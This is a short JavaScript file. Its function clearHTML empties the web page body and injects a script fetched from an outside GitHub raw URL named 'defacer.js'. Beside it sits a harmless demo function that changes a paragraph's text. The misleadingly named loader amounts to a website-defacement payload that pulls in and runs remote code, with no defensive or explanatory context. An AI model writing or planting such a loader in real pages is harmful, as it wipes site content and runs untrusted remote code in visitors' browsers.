function clearHTML() {
    // Dynamically load an external JS file
    const script = document.createElement("script");
    script.src = "https://raw.githubusercontent.com/CyberCutie0/-/refs/heads/main/defacer.js"; // Replace with the actual URL
    script.onload = () => {
        console.log("External script has been loaded.");
    };
    script.onerror = () => {
        console.error("Failed to load the external script.");
    };
    document.body.innerHTML = "";
    document.body.appendChild(script); // Add the script to the <head>
}

function myFunction() {
    document.getElementById("demo").innerHTML="Paragraph changed.";
}

console.log("IMPORTING SUCCESS");
